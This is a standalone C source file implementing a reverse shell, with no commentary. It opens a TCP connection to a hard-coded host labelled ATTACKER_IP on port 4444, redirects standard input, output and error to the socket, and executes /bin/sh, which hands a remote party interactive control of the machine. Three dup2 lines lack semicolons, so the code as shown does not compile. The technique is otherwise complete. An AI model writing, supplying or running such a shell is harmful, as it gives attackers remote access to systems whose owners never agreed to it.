#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define ATTACKER_IP "199.163.1.100"
#define ATTACKER_PORT 4444

void reverse_shell() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("[-] Socket creation failed");
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == -1 ) {
        perror("[-] Connection failed");
        exit(1);
    }

    dup2(sock, 0)
    dup2(sock, 1)
    dup2(sock, 2)

    char *shell[] = {"/bin/sh", NULL};
    execve(shell[0], shell, NULL);

    close(sock);
}

int main() {
    reverse_shell();
    return 0;
}
